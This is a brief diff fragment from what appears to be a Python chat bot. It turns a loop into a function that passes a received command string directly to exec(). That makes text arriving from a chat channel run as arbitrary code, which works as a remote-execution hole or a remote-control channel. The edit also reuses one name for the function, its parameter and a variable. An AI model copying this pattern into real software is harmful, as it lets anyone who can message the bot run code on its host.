@@ -8,7 +8,7 @@ chan = returndata()[4]
 message = returndata()[5]
 command = returndata()[6]
 
-while True:
+def command(command):
     if command:
         try:
             exec(command)
